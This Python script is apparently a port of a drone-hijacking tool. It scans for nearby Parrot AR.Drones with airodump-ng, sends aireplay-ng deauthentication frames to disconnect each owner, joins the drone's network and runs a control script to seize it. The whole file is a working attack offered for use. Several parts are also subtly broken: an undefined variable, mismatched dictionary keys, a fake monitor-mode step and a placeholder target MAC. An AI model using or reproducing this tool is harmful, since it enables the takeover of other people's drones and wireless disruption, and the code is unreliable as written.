import subprocess
import time
import os
import glob
import multiprocessing

def put_device_into_monitor_mode(interface):
    subprocess.run(["sudo", "ifconfig", interface, "down"])
    time.sleep(1)

def get_aps(interface, tmpfile):
    subprocess.run(["sudo", "airodump-ng", "--output-format", "csv", "-w", tmpfile, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    subprocess.run(["sudo", "pkill", "airodump-ng"])

def read_aps(tmpfile, drone_macs):
    clients = {}
    chans = {}

    for tmpfile1 in glob.glob(f"{tmpfile}*.csv"):
        with open(tmpfile1, "r") as aps_file:
            for line in aps_file:
                line = line.strip()
                if not line:
                    continue

                # Determine the channel
                if "ardrone" in line:
                    fields = line.split(",")
                    mac_address = fields[0].strip()
                    channel = int(fields[1].strip())
                    ssid = fields[6].strip()
                    chans[mac_address] = [channel, ssid]

                # Grab the drone MAC and owner MAC
                for dev in drone_macs:
                    if dev in line:
                        fields = line.split(",")
                        drone_mac = fields[0].strip()
                        client_mac = fields[1].strip()
                        clients[client_mac] = drone_mac

        os.remove(tmpfile1)

    return clients, chans

def jump_to_channel(interface, channel):
    subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)])
    time.sleep(1)

def disconnect_owner(interface, aireplay_command, drone_mac, client_mac):
    subprocess.run(["sudo", aireplay_command, "-0", "3", "-a", drone_mac, "-c", client_mac, interface])

def connect_to_drone(interface2, ssid):
    subprocess.run(["sudo", "iwconfig", interface2, "essid", ssid])

def acquire_ip(interface2):
    subprocess.run(["sudo", "dhclient", "-v", interface2])

def take_over_drone(nodejs_command, controljs):
    subprocess.run(["sudo", nodejs_command, controljs])

def perform_rf_signal_disruption(interface):
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", "target_AP_MAC", interface])

def charm_drone(interface, drone_mac, client_mac, interface2, ssid):
    jump_to_channel(interface, chans[drone_mac][0])
    disconnect_owner(interface, "aireplay-ng", drone_mac, client_mac)

    connect_to_drone(interface2, ssid)
    acquire_ip(interface2)

    take_over_drone("nodejs", "drone_control/drone_pwn.js")

    perform_rf_signal_disruption(interface)

def main():
    interface = input("Enter the interface (default: wlan1): ") or "wlan1"
    interface2 = input("Enter the second interface (default: wlan0): ") or "wlan0"
    drone_macs = []  # Add the drone MAC addresses

    put_device_into_monitor_mode(interface)
    tmpfile = "/tmp/dronestrike"
    skyjacked = {}

    try:
        while True:
            get_aps(interface, tmpfile)
            clients, chans = read_aps(tmpfile, drone_macs)

            for cli, drone_mac in clients.items():
                print(f"Found client ({cli}) connected to {chans[drone_mac][1]} ({drone_mac}, channel {chans[drone_mac][0]})")

                jump_to_channel(interface, chans[drone_mac][0])
                disconnect_owner(interface, "aireplay-ng", drone_mac, cli)

            time.sleep(2)

            pool = multiprocessing.Pool(processes=len(chans))
            jobs = []

            for drone_mac, channel_ssid in chans.items():
                if channel_ssid[1] in skyjacked:
                    continue

                skyjacked[channel_ssid[1]] = True
                print(f"Connecting to drone {channel_ssid[1]} ({drone_mac})")

                # Charm the drone using multiple processes
                job = pool.apply_async(charm_drone, (interface, drone_mac, clients[drone_mac], interface2, channel_ssid[1]))
                jobs.append(job)

            # Wait for all processes to finish
            for job in jobs:
                job.get()

            pool.close()
            pool.join()

            time.sleep(5)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
